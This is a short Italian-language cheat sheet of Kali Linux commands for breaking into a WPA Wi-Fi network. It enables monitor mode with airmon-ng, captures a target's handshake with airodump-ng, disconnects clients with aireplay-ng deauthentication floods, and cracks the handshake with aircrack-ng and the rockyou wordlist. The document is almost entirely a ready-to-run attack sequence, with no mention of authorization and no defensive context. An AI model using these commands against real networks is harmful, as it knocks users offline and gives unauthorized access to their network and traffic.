# Wi-Fi
Visualizza scheda di rete 
```
ifconfig
```
oppure
```
ip a
```
avvia scheda di rete in monitor mode
```
sudo airmon-ng start wlan0
```
esempio:
erpressa@kali:~# sudo airmon-ng start wlan0
avvia airodump-ng 
```
sudo airodump-ng wlan0mon 
```
copiare bssid e station
premi spazio oppure ctrl + c per terminare 
```

sudo airodump-ng --bssid FF:FF:FF:FF:FF:FF -c 1 -w /home/kali/handshake.cap wlan0mon
```
esempio
```
sudo airodump-ng --<BSSID> -c <CANALE> -w <PERCORSO-FILE> <INTERFACCIA> 
```

scollegare clients a=bssid c=clients
```
sudo aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF wlan0mon

```
oppure 
```
sudo aireplay-ng --deauth 1000 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF wlan0mon
```
cracking con aircrack-ng 
```
sudo aircrack-ng file.cap -w /home/kali/rockyou.txt
```
